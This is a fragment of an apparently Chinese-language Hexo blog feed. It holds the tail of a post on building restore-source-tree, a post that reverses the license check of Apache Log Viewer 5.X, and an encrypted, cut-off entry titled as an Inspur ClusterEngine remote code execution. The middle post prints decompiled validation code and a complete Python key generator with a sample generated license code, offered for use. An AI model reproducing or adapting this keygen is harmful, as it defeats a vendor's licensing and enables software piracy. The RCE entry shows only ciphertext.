class="attr">&quot;babel-preset-es2015&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^6.9.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;babel-preset-stage-0&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^6.5.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;eslint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.1.1&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>然后执行<code>npm install</code></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install</span><br><span class="line">npm WARN prepublish-on-install As of npm@5, `prepublish` scripts are deprecated.</span><br><span class="line">npm WARN prepublish-on-install Use `prepare` for build steps and `prepublishOnly` for upload-only.</span><br><span class="line">npm WARN prepublish-on-install See the deprecation note in `npm help scripts` for more information.</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&gt; </span><span class="language-bash">restore-source-tree@0.1.1 prepublish C:\Users\Administrator\Desktop\qubu\restore-source-tree</span></span><br><span class="line"><span class="meta">&gt; </span><span class="language-bash">npm run build</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&gt; </span><span class="language-bash">restore-source-tree@0.1.1 build C:\Users\Administrator\Desktop\qubu\restore-source-tree</span></span><br><span class="line"><span class="meta">&gt; </span><span class="language-bash">cross-env NODE_ENV=production babel index.js --out-file dist.js</span></span><br><span class="line"></span><br><span class="line">npm notice created a lockfile as package-lock.json. You should commit this file.</span><br><span class="line">npm WARN restore-source-tree@0.1.1 No repository field.</span><br><span class="line">npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@1.2.11 (node_modules\fsevents):</span><br><span class="line">npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for fsevents@1.2.11: wanted &#123;&quot;os&quot;:&quot;darwin&quot;,&quot;arch&quot;:&quot;any&quot;&#125; (current: &#123;&quot;os&quot;:&quot;win32&quot;,&quot;arch&quot;:&quot;x64&quot;&#125;)</span><br><span class="line"></span><br><span class="line">audited 4406 packages in 16.868s</span><br><span class="line"></span><br><span class="line">3 packages are looking for funding</span><br><span class="line">  run `npm fund` for details</span><br><span class="line"></span><br><span class="line">found 1 low severity vulnerability</span><br><span class="line">  run `npm audit fix` to fix them, or `npm audit` for details</span><br></pre></td></tr></table></figure><p>编译成功，<code>restore-source-tree</code>整体拷贝到<code>C:\Users\Administrator\AppData\Roaming\npm\node_modules\restore-source-tree</code>即可使用</p><p><img src="/images/image-20200313170912252.png" alt="image-20200313170912252"></p><h1 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h1><p>Windows平台不允许路径、文件中含有<code>?</code>等特殊字符，修改<code>dist.js</code>中101行前后为</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">(<span class="number">0</span>, _mkdirp2.<span class="property">default</span>)(dir, <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Failed creating directory&#x27;</span>, dir);</span><br><span class="line">    process.<span class="title function_">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    outPath=outPath.<span class="title function_">replace</span>(<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;_&#x27;</span>);<span class="comment">//替换特殊字符</span></span><br><span class="line">    _fs2.<span class="property">default</span>.<span class="title function_">writeFile</span>(outPath, content, <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Failed writing file&#x27;</span>, outPath);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>修改前</p><p><img src="/images/image-20200313171223971.png" alt="image-20200313171223971"></p><p>修改后</p><p><img src="/images/image-20200313171232939.png" alt="image-20200313171232939"></p><p>代码也正常还原了</p><p><img src="/images/image-20200313171253553.png" alt="image-20200313171253553"></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Log Viewer 5.X 注册机</title>
      <link href="/p/a73d.html"/>
      <url>/p/a73d.html</url>
      
        <content type="html"><![CDATA[<p>抽空研究了下<code>ALV</code>的注册机制，写了个注册机</p><span id="more"></span><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>ALV的注册方法是<code>unlockCodeToolStripMenuItem_Click</code>方法，当点击<code>Unlock</code>按钮时会触发注册事件并调用<code>Class2</code>类中的<code>smethod_1</code>、<code>smethod_0</code>2个方法进行校验，详细流程见如下代码</p><p><code>unlockCodeToolStripMenuItem_Click</code>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">unlockCodeToolStripMenuItem_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">string</span> text = <span class="keyword">this</span>.prefs_0.Key;</span><br><span class="line"><span class="keyword">if</span> (!InputForm.smethod_3(<span class="string">&quot;Apache Logs Viewer | &quot;</span> + Class96.smethod_264(), Class96.smethod_143(), <span class="keyword">ref</span> text))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (text != <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">text = text.Trim();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">string</span>.IsNullOrEmpty(text))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.prefs_0.Key = <span class="built_in">string</span>.Empty;</span><br><span class="line"><span class="keyword">this</span>.bool_0 = <span class="literal">false</span>;</span><br><span class="line">Prefs.Save(Prefs.Filename, <span class="keyword">this</span>.prefs_0);</span><br><span class="line"><span class="keyword">this</span>.method_2(<span class="keyword">this</span>.bool_0);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.Cursor = Cursors.WaitCursor;</span><br><span class="line"><span class="keyword">if</span> (text.Length &lt; <span class="number">22</span>)<span class="comment">//检查key长度是否大于22</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ApplicationException(<span class="string">&quot;Failed&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Class2.smethod_1(Class2.smethod_0(text)))<span class="comment">//重点位置</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.prefs_0.Key = text;</span><br><span class="line"><span class="keyword">this</span>.method_23();</span><br><span class="line">Prefs.Save(Prefs.Filename, <span class="keyword">this</span>.prefs_0);</span><br><span class="line"><span class="keyword">this</span>.Cursor = Cursors.Default;</span><br><span class="line"><span class="keyword">this</span>.lbStatusStripNotify.Text = Class96.smethod_253() + <span class="string">&quot; Apache Logs Viewer.&quot;</span>;</span><br><span class="line">MessageBox.Show(<span class="keyword">this</span>, Class96.smethod_253() + <span class="string">&quot; Apache Logs Viewer.&quot;</span>, <span class="string">&quot;Apache Logs Viewer&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);</span><br><span class="line"><span class="keyword">this</span>.bool_0 = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">MessageBox.Show(<span class="keyword">this</span>, Class96.smethod_117(), <span class="string">&quot;Apache Logs Viewer | &quot;</span> + Class96.smethod_264(), MessageBoxButtons.OK, MessageBoxIcon.Hand);</span><br><span class="line"><span class="keyword">this</span>.bool_0 = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (Exception)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.Cursor = Cursors.Default;</span><br><span class="line">MessageBox.Show(<span class="keyword">this</span>, Class96.smethod_90(), <span class="string">&quot;Apache Logs Viewer | &quot;</span> + Class96.smethod_264(), MessageBoxButtons.OK, MessageBoxIcon.Hand);</span><br><span class="line"><span class="keyword">this</span>.bool_0 = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.Cursor = Cursors.Default;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>.method_2(<span class="keyword">this</span>.bool_0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Class2.smethod_0</code>方法，</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">smethod_0</span>(<span class="params"><span class="built_in">string</span> string_0</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (string_0.IndexOf(<span class="string">&#x27;-&#x27;</span>) &lt; <span class="number">0</span>)<span class="comment">//检查注册代码中是否有-</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> string_0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">string</span> str = <span class="string">&quot;DBV&quot;</span>;</span><br><span class="line">string_0 = string_0.Replace(<span class="string">&quot;-&quot;</span>, <span class="built_in">string</span>.Empty);<span class="comment">//将字符-转为空</span></span><br><span class="line">string_0 = string_0.Replace(<span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;4&#x27;</span>);<span class="comment">//Q转为4</span></span><br><span class="line">string_0 = string_0.Replace(<span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;4&#x27;</span>);<span class="comment">//G转为4</span></span><br><span class="line">string_0 = string_0.Replace(<span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;0&#x27;</span>);<span class="comment">//V转为0</span></span><br><span class="line">string_0 = string_0.Replace(<span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;3&#x27;</span>);<span class="comment">//N转为3</span></span><br><span class="line">str + string_0;<span class="comment">//无用语句</span></span><br><span class="line"><span class="built_in">byte</span>[] array = <span class="keyword">new</span> <span class="built_in">byte</span>[string_0.Length / <span class="number">2</span>];<span class="comment">//新建个数组，长度是去掉-后的注册码长度的一半</span></span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; string_0.Length; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">byte</span> b;</span><br><span class="line"><span class="built_in">byte</span>.TryParse(<span class="keyword">new</span> <span class="built_in">string</span>(<span class="keyword">new</span> <span class="built_in">char</span>[]</span><br><span class="line">&#123;</span><br><span class="line">string_0[i],</span><br><span class="line">string_0[i + <span class="number">1</span>]</span><br><span class="line">&#125;), NumberStyles.HexNumber, CultureInfo.InvariantCulture, <span class="keyword">out</span> b);<span class="comment">//每两位进行拼接并转回字符串形式并依次存入b</span></span><br><span class="line">array[i / <span class="number">2</span>] = b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">string</span> text = Encoding.ASCII.GetString(array);<span class="comment">//将注册码转为字符串形式，传入的注册码为hex后的ascii值</span></span><br><span class="line">text = text.Insert(<span class="number">1</span>, <span class="string">&quot;:&quot;</span>);<span class="comment">//第2位插入：</span></span><br><span class="line">text = text.Insert(<span class="number">5</span>, <span class="string">&quot;:&quot;</span>);<span class="comment">//第6位插入：</span></span><br><span class="line">text = text.Insert(<span class="number">9</span>, <span class="string">&quot;:&quot;</span>);<span class="comment">//第10位插入：</span></span><br><span class="line"><span class="keyword">if</span> (text.Length &gt; <span class="number">13</span>)</span><br><span class="line">&#123;</span><br><span class="line">text = text.Insert(<span class="number">13</span>, <span class="string">&quot;:&quot;</span>);<span class="comment">//如果注册码长度大于13则在第13位插入：</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Class2.smethod_1</code>方法，</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">bool</span> <span class="title">smethod_1</span>(<span class="params"><span class="built_in">string</span> string_0</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line"><span class="built_in">string</span> a = string_0.Substring(<span class="number">4</span>, <span class="number">5</span>);<span class="comment">//取经过smethod_0处理后的字符串中的第4到8位</span></span><br><span class="line">    <span class="comment">//如果a为IALV或注册码第一位不为F或第3位转为int型大于16或a不为I:ALV或注册码第4位转为int型大于16则抛出注册码错误</span></span><br><span class="line"><span class="keyword">if</span> (a == <span class="string">&quot;IALV&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (string_0[<span class="number">0</span>] != <span class="string">&#x27;F&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">int</span> num = <span class="built_in">int</span>.Parse(string_0[<span class="number">2</span>].ToString(), NumberStyles.HexNumber);</span><br><span class="line"><span class="keyword">if</span> (num &gt; <span class="number">16</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (a != <span class="string">&quot;I:ALV&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">num = <span class="built_in">int</span>.Parse(string_0[<span class="number">3</span>].ToString(), NumberStyles.HexNumber);</span><br><span class="line"><span class="keyword">if</span> (num &gt; <span class="number">16</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">int</span>.TryParse(string_0.Substring(<span class="number">10</span>, <span class="number">3</span>), <span class="keyword">out</span> num))</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//处理后的注册码如果长度小于14则抛错</span></span><br><span class="line"><span class="keyword">if</span> (string_0.Length &lt;= <span class="number">14</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ApplicationException(<span class="string">&quot;Invalid Unlock Code&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//命名num2变量，值为注册码的第15位，并判断num2是否为2或3，不是就抛错</span></span><br><span class="line"><span class="built_in">int</span> num2 = <span class="built_in">int</span>.Parse(string_0.Substring(<span class="number">15</span>, <span class="number">1</span>));</span><br><span class="line"><span class="keyword">if</span> (num2 != <span class="number">2</span> &amp;&amp; num2 != <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> ApplicationException(<span class="string">&quot;Incorrect Code for Version&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">string</span> s = string_0.Substring(<span class="number">0</span>, <span class="number">16</span>);<span class="comment">//s为1~17位</span></span><br><span class="line"><span class="built_in">string</span> b = string_0.Substring(<span class="number">16</span>);<span class="comment">//b为17位后的校验位</span></span><br><span class="line"><span class="built_in">int</span> num3 = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">byte</span>[] bytes = Encoding.ASCII.GetBytes(s);<span class="comment">//将s转为字节码并存入数组</span></span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; bytes.Length; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (bytes[i] % <span class="number">2</span> == <span class="number">0</span>)<span class="comment">//每一位进行模2运算，为0则num3+1</span></span><br><span class="line">&#123;</span><br><span class="line">num3++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> !(num3.ToString(<span class="string">&quot;00&quot;</span>) != b) &amp;&amp; flag;<span class="comment">//num3向上取整后与校验位作比较，比较成功则返回真</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Keygen"><a href="#Keygen" class="headerlink" title="Keygen"></a>Keygen</h1><p>有了注册机制就可以写注册机了，这里用python写了一个</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@Author         : Sp4ce</span></span><br><span class="line"><span class="string">@Date           : 2020-02-19 19:17:59</span></span><br><span class="line"><span class="string">@LastEditors    : Sp4ce</span></span><br><span class="line"><span class="string">@LastEditTime   : 2020-02-19 23:27:40</span></span><br><span class="line"><span class="string">@Description    : Challenge Everything.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">          _ __      __  _  __           _____            </span></span><br><span class="line"><span class="string">    /\   | |\ \    / / | |/ /          / ____|           </span></span><br><span class="line"><span class="string">   /  \  | | \ \  / /  | &#x27; / ___ _   _| |  __  ___ _ __  </span></span><br><span class="line"><span class="string">  / /\ \ | |  \ \/ /   |  &lt; / _ \ | | | | |_ |/ _ \ &#x27;_ \ </span></span><br><span class="line"><span class="string"> / ____ \| |___\  /    | . \  __/ |_| | |__| |  __/ | | |</span></span><br><span class="line"><span class="string">/_/    \_\______\/     |_|\_\___|\__, |\_____|\___|_| |_|</span></span><br><span class="line"><span class="string">                                  __/ |                  </span></span><br><span class="line"><span class="string">                                 |___/     </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                Apache Log Viewer 5.X KeyGen</span></span><br><span class="line"><span class="string">                                                  By:Sp4ce</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genLicenseCode</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        hexdata = data.replace(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        data = <span class="string">&quot;&quot;</span>.join(data.split(<span class="string">&#x27;-&#x27;</span>))</span><br><span class="line">        num = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> hexdata:</span><br><span class="line">            a = binascii.b2a_hex(i.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(a, <span class="number">16</span>) % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                num = num+<span class="number">1</span></span><br><span class="line">        hexData = binascii.b2a_hex((data+<span class="built_in">str</span>(num)).encode(<span class="string">&#x27;utf-8&#x27;</span>)) .decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        hexData = <span class="built_in">list</span>(hexData)</span><br><span class="line">        hexData.insert(<span class="number">2</span>, <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">        hexData.insert(<span class="number">9</span>, <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">        hexData.insert(<span class="number">16</span>, <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">        hexData.insert(<span class="number">23</span>, <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">        licenseCode = <span class="string">&#x27;&#x27;</span>.join(hexData)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] License Code Generate Success!\nYour License Code: -&gt;[&quot;</span>+licenseCode.upper()+<span class="string">&quot;]&lt;-&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] License Code Generate Failed!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    banner()</span><br><span class="line">    data = []</span><br><span class="line">    data.append(<span class="string">&#x27;F&#x27;</span>)  <span class="comment"># 第一位必须：F</span></span><br><span class="line">    data.append(<span class="string">&#x27;-&#x27;</span>)  <span class="comment"># 第一个-</span></span><br><span class="line">    data.append(random.randint(<span class="number">1</span>, <span class="number">9</span>))  <span class="comment"># 第3位转为int后必须小于16</span></span><br><span class="line">    data.append(random.randint(<span class="number">1</span>, <span class="number">9</span>))  <span class="comment"># 第4位转为int后必须小于16</span></span><br><span class="line">    data.append(<span class="string">&#x27;I&#x27;</span>)  <span class="comment"># I</span></span><br><span class="line">    data.append(<span class="string">&#x27;-&#x27;</span>)  <span class="comment"># 第二个-</span></span><br><span class="line">    data.append(<span class="string">&#x27;ALV&#x27;</span>)  <span class="comment"># ALV</span></span><br><span class="line">    data.append(<span class="string">&#x27;-&#x27;</span>)  <span class="comment"># 第三个-</span></span><br><span class="line">    data.append(random.randint(<span class="number">100</span>, <span class="number">999</span>))  <span class="comment"># 第11~13位必须为int型</span></span><br><span class="line">    data.append(<span class="string">&#x27;-&#x27;</span>)  <span class="comment"># 第四个-</span></span><br><span class="line">    data.append(random.randint(<span class="number">1</span>, <span class="number">9</span>))  <span class="comment"># 第14位随机</span></span><br><span class="line">    data.append(random.randint(<span class="number">2</span>, <span class="number">3</span>))  <span class="comment"># 第15位必须为2或3</span></span><br><span class="line">    data = <span class="string">&quot;&quot;</span>.join(<span class="string">&#x27;%s&#x27;</span> % i <span class="keyword">for</span> i <span class="keyword">in</span> data).upper()</span><br><span class="line">    genLicenseCode(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行后</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">          _ __      __  _  __           _____</span><br><span class="line">    /\   | |\ \    / / | |/ /          / ____|</span><br><span class="line">   /  \  | | \ \  / /  | &#x27; / ___ _   _| |  __  ___ _ __</span><br><span class="line">  / /\ \ | |  \ \/ /   |  &lt; / _ \ | | | | |_ |/ _ \ &#x27;_ \</span><br><span class="line"> / ____ \| |___\  /    | . \  __/ |_| | |__| |  __/ | | |</span><br><span class="line">/_/    \_\______\/     |_|\_\___|\__, |\_____|\___|_| |_|</span><br><span class="line">                                  __/ |</span><br><span class="line">                                 |___/</span><br><span class="line"></span><br><span class="line">                Apache Log Viwer 5.X KeyGen</span><br><span class="line">                                                  By:Sp4ce</span><br><span class="line"></span><br><span class="line">[+] License Code Generate Success!</span><br><span class="line">Your License Code: -&gt;[46-313449-414C56-353934-33323130]&lt;-</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h1><p>该软件注册机制还有第二种方案，抽空再写</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crack </tag>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浪潮ClusterEngineV4.0远程代码执行</title>
      <link href="/p/7dbf.html"/>
      <url>/p/7dbf.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="7aad9ec1815b1cd8bdd9efc3d46add160b63e0ee7f21a7e9b77283a435caad8d">c1eaa03b761144d4b351aa8bd40bf7eb6cf248c937441009eef2d13e0b49b0ddd8f41f80c4819f78f66fbf9d0d42c1b42e93892e9631c73b0ab43677392f07637fe67c34bce60fa22292c451a4f8da0894d4424fd875617c575d58066488eca95c75256ba75f2b066b26dafd85390092c8b25e275be03fda676b9c45b92b7cbba662310b16f94b50d6404506a4d2b5984600f81223dec5dacbf03641bd817613fe3d81a3fdfff83c6c46b1f2e0a5b9fc9f10e7fe4f4e6ede39e9aea36596aab061f40d338f03940fb815b30e63cb64991adbbe89801abec5bdf17692d03b50a0950765671dbcf33f054bc88f2892e336b54b7f3c24e53b25973544837ef26c4aeeaa03e78dcf96b9e377dde65f11894d34a47c3250d04f27e292b88dea055193552bc89ed43e03dd16584f54e184878bd854c3028e770c49b3f734ec6a913360ea7cf6222f2928f0f9cc4e7653683cd1bf75dcbb5adfbf0bc663e6b45c26c129e5c1bd327b4efa6386d60ec7e8b9c4bdf142522da24bce89911766a162f850cc7d0e9f83c570e326cdf2cba8327f303ba1c4a32465c152712121c288394c29cbc3efc9f45bd599c70ce5bd902d467bb7d59f97294b72c3d23f0ea229b0ad83f30a9364d3d1babeaec34beb7cf1c772c0bbc02688a971b86af5d215dd174b5eb7c3b1bb4969bfaf3fca570203c8531c64b820654f28d2c16c58247ad23597f09afdc944526554c35708822a15a3cc31c23eed6fa968de5640d1a5aa92c95e87376081f78ec9109c19576e3fd8613c53b0de666c09e256ecb8fb85ee24b0dba73225341eb75b76e10d171a379b481c6bc157ce739f61c7dd7e50179f43bd916b91e9bc1909842720f872a1e80a6df0213d12ccc821d0cc1a9a59904bf32488816e0bd60959049d1c45871303feb5d0ef2fd8bc0d587996c178f7a1f6d25cab4416938b236074b1c2121c46f4a6113e66bc3442faae5e61992ce453a8487d05c1b5734bce6f777bac3ace7db511d8b30b061071a80d90a9ff10363ba2259d18b16ead516b6b4ef99d718bb6f6b9a71b4ec3285a396c492cc75c3907c2f326aeb83e3cfc0803d95fa4ab399ef71d99395bf234c79abb23c71646b63fce35460289bb9557456b6c9b3fd3a41113ad0c89bea1aab99d672ef52d34904df346ca03801b15c24d5e57d0e5ad75949ebf00fbc48687bc7523a66fd2a3a321479f0aed6cf5dafc3df0afa3a7bcc4fc6acc30cdab6018237881cb4c4d275fcbd9a6e3559a0722285ecca89005aaf6bc8045c623757f5ceadb99403f377506a13220338017d9f4401da4105c5ab249f7cb3742b826f73db4657dc2fcab708f5f8b88cd9cf5d6aa7348ca42330490ccfc9e9964043004c215952e8e8c36f59609dc9cd8ed8d97a2239a0abe4a9cbe79501261dd009fbda45886664922ffee1e12c443f1c92ff9c73fc16de7350fffb624aa91527c510eebff56effe8cb0e9d03f71d33b50c689f2c08c801aad4b86a5ede99c905c668a95dcbc343b3623fa956b899ee7f129f6086b1277fd0fdd463211aa58168b958da6d8e1e70d766b3b45fdb374e350659949c25cbcade07b9e8d837028e951a0189b6b7e94e89b34f91ae8f0e9b13697842e4c95879b668d67920bf7470438c4d2ebe2aed4382b9dbbff25dbff8fa122983d92510cb7d0092bcead9652513737daf5a5f9e0eb1078ac81d5ac8ffc870975e17d3d05a4bc3b4e196d3543f9efaa1dfd5cccec1c533efb6dc1f4a76fa458026f46bf4695bce388ae4e5e37e125743efb965aa5eed75e80e4d57ec855ccff093cd86db082a1f3d18aff89066ea9fae76c720f25a0741793a43062f5681ccb16109fe944741aa208d778ac5c8bcf635f1d708199dac0dd5ea4dccd9ad63f1c8910a7a8945d76bfd249dfd56c1d876a12bb2da367489358c85f6b90290c5b6e55abc8b949b6dd14ffec1db66a058e93b58c2259f1a9ce09ab00eb873091286bc01196b88cfd12e7276b8825714d02991f02e990e6afc9ca9cf36536fe798d92d71f14547db0b6c50857bb8ab14ce8f95126dda8b79d233449eb0246848a0974ff7997fd738120936a153937a98e0e95f8b9c1f4cafad10c3178fc8db1236de7a02f0c0cc0f0401112d530b245edabd08ef09ed7a2fb7f854230d901b300e4b3c575fcd3b302bb87e6a98127503f78220ef2899d5c77b33bca23b00ce4e350012b9a268fadc96b5ade057fad6007de6895ea545c5f42789f7d962b28c95d0e0668a8cd6684b902f6b96d63ed829d28d67db8889db418d7debed28014ed4c493d58853ed89fd5455b1667fce17ef2727a8a024b94c1b53d5511a57749d2b159a6fe390f25a6800cc815d9248b65e3c7a7a1165b0100d97bbc09924b735fabb1c1e01380d6aeacd1c6af469cefef3912bf3ef4efa154f91bfc0dccebcf177ba45fc41112d8ed662a020715bdc845f89b6e31e46c94b31361184347e2ac106a9371ba08f6ebb016ad81a5e27e7f9b551ade786c1804aa3c7781af82f8f2ad6a675fb073b97ed8b172c4468c7498b7246ea9145921b2155c4587ab7969a6a1aa0815e9f970737c8a61f0e60595f6d8877b25b9ca169673948d05c31822346d57ac8beae177b1ffd7d3d4f4a8bf5b5ad6a9b8fb19b27b5d1c3fe1cf7d2121b05735d7f0785fcc52a2978974a26f61d52cf71a1e4fad8992304d51654d2dc02cbc4f3cba91b692325bdd19d803239665dd3756fde58f86881110be5be2a23fef63259394b6b8f0448720cb80db24c453b8ff9085d923a431fcebec6a106a490884bc6e5fdeee746a12b13afecb49257de6873b21da8014124e98938b2ef17a35487b4bef86f0543f11be60e8eeee3f76a0eb80564bf46b7a515f14d262ab